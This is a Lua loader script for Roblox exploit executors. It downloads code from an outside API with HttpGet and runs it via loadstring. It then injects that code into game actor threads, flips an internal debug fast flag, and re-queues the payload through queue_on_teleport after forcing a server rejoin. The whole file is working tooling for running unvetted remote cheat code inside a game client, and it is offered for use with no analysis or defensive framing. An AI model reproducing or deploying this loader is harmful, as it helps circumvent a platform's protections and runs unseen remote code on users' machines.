-- This isn't my loader
local ExecutorName = (identifyexecutor and identifyexecutor() or ""):lower()

local Source = [[
getgenv().SCRIPT_KEY = "KEYLESS"
loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/680cb3160eb57826849c357d82cb511a6986ec128fa0c3abdec457870c918cac/download"))()
]]

local ThreadSource = ([[local Shared = getrenv().shared if Shared and Shared.require then %s end]]):format(Source)

local Executor = {
    { "wave", get_deleted_actors, run_on_actor },
    { "choco", get_deleted_actors, run_on_actor },
    { "volt", getactors, run_on_actor },
    { "synapse", getactors, run_on_actor },
    { "potassium", getactorthreads, run_on_thread }--,
    --{ "velocity", getactorthreads, run_on_thread }, -- velocity actors are trash
}

local function JoinServer()
    local Http = game:GetService("HttpService")
    local Teleport = game:GetService("TeleportService")
    local Players = game:GetService("Players")
    
    local Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100&excludeFullGames=true"
    local Success, Response = pcall(function() 
        return Http:JSONDecode(game:HttpGet(Url)) 
    end)
    
    if Success and Response and Response.data then
        for _, Server in ipairs(Response.data) do
            if Server.id ~= game.JobId and (Server.maxPlayers - Server.playing) >= 4 then
                Teleport:TeleportToPlaceInstance(game.PlaceId, Server.id, Players.LocalPlayer)
                break
            end
        end
    end
end

for _, Executors in ipairs(Executor) do
    local Executor = Executors[1]
    local GetActors = Executors[2]
    local Execute = Executors[3]

    if ExecutorName:find(Executor, 1, true) then
        for _, Actor in ipairs(GetActors()) do
            Execute(Actor, ThreadSource)
        end
        return
    end
end

if getfflag and string.lower(tostring(getfflag("DebugRunParallelLuaOnMainThread"))) == "true" then
    loadstring(Source)()
elseif setfflag then
    setfflag("DebugRunParallelLuaOnMainThread", "True")

    local Workspace = game:GetService("Workspace")
    local Camera = Workspace.CurrentCamera
    local StatusText = Drawing.new("Text")
    StatusText.Position = Camera.ViewportSize / 2
    StatusText.Center = true
    StatusText.Outline = true
    StatusText.Visible = true
    StatusText.Size = 25
    StatusText.Color = Color3.new(1, 1, 1)
    StatusText.Text = "You are about to rejoin if the script does not execute you may reexecute it"
    
    task.wait(5)
    StatusText:Remove()

    if queue_on_teleport then
        queue_on_teleport([=[
            repeat task.wait() until game:IsLoaded()
            task.wait(2)
        ]=] .. Source)
    end

    JoinServer()
else
    loadstring(Source)()
end
